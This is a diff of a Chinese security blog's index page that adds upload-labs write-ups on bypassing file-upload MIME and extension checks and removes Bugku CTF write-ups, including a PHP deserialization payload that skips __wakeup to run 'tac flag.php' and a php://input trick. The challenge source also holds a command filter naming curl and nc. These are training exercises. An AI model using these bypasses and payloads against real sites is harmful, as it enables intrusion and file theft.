@@ -164,6 +164,190 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-uploadlabs-3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/27/uploadlabs-3/">uploadlabs-3</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/27/uploadlabs-3/" class="archive-article-date">
+  	<time datetime="2021-09-27T13:23:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码解释：<br>trim():去除文件前后的空格，tab等字符<br>deldot():删除文件名末尾的点<br>strrchr($file_name, ‘.’);:截取文件名中点后面的字符串（包括点）<br>strtolower($file_ext); //转换为小写<br>str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p>
+<p>先上传一个php，发现可以构筑数据包，所以是后端检测</p>
+<p>随便上传一个hack.png文件，发现显示的文件路径为<code>upload/202109272127051740.png</code><br>所以文件是通过<code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;  </code>随机生成的文件名</p>
+<p>前文说了，只要是后端检测，我们就不可能在检测之后把被检测的部分改过来了（因为那时候文件已经到了服务器端）</p>
+<p>不过虽然php被禁了，但是能被解析成php代码的文件还有<code>phtml,php3,php4,php5,pht</code>,随便写一个就好了<br>（但是如果使用的是phpstudy，phpstudy这个配置文件把以上后缀都给注释了，所以如果不改的话这一关相当于没有漏洞，修改方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43480081/article/details/102504348%EF%BC%89">https://blog.csdn.net/qq_43480081/article/details/102504348）</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/27/uploadlabs-3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-uploadlabs-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/26/uploadlabs-2/">uploadlabs-2</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/26/uploadlabs-2/" class="archive-article-date">
+  	<time datetime="2021-09-26T14:47:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这一次看源代码，已经没有了js脚本，很明显这是一个后端检测，所以前面上传什么都没有问题，会顺利的构筑数据包，等数据包发送后才会被检测。<br>检测的是文件的type，是并不会影响文件属性的参数<br>所以有两种方法：<br>1.上传hack.php，抓包以后把<code>Content-Type</code>改成<code>image/gif</code><br>2.上传hack.png，抓包以后把文件名改成hack.php<br>最后结果：</p>
+<img src="/2021/09/26/uploadlabs-2/1.PNG" class="" title="1.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/26/uploadlabs-2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-uploadlabs-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1066,201 +1250,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/12/bugku-web-noteasytrick/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-安慰奖" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/">bugku-web-安慰奖</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/" class="archive-article-date">
-  	<time datetime="2021-08-12T03:46:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>查看源代码，发现一个base64，解码后发现backups，没看懂是什么意思</p>
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/1.PNG" class="" title="1.PNG">
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/2.PNG" class="" title="2.PNG">
-<p>扫目录发现备份文件才明白那个backup大概是提示的这个</p>
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/3.PNG" class="" title="3.PNG">
-
-<p>文件打开后是php源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!-- YmFja3Vwcw&#x3D;&#x3D; --&gt;&quot;;</span><br><span class="line">class ctf</span><br><span class="line">&#123;</span><br><span class="line">    protected $username &#x3D; &#39;hack&#39;;</span><br><span class="line">    protected $cmd &#x3D; &#39;NULL&#39;;</span><br><span class="line">    public function __construct($username,$cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;cmd &#x3D; $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;cat|more|tail|less|head|curl|nc|strings|sort|echo&#x2F;i&quot;, $this-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            exit(&#39;&lt;&#x2F;br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">           &#x2F;&#x2F; echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span><br><span class="line">            $a &#x3D; &#96;$this-&gt;cmd&#96;;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;给你个安慰奖吧，hhh！&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>反序化题，没有过滤tac和ls</p>
-<p>payload(因为这道题涉及protected，所以反序化后会有空字符，必须用url编码）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctf</span><br><span class="line">&#123;</span><br><span class="line">	protected $username &#x3D; &#39;admin&#39;;</span><br><span class="line">    protected $cmd &#x3D; &#39;[shell]&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new ctf;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
-
-<p>还需要绕过wakeup（不然就会变成guest），当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行，所以还需要把2改成3。</p>
-<p>最终payload：<br>ls：<code>?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A2%3A%22ls%22%3B%7D</code></p>
-<p>tac flag.php:<code>?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A12%3A%22tac+flag.php%22%3B%7D</code></p>
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/4.PNG" class="" title="4.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-file-get-contents" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-file-get-contents/">bugku-web-file_get_contents</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-file-get-contents/" class="archive-article-date">
-  	<time datetime="2021-08-12T03:39:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>file_get_contents</code>是把文件读取成字符串</p>
-<p>所以用<code>php://input</code></p>
-<p>传入<code>?fn=php://input&amp;ac=1</code><br>然后post传入<code>1</code><br>得到flag</p>
-<img src="/2021/08/12/bugku-web-file-get-contents/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-file-get-contents/">展开全文 >></a>
         </p>
       
 
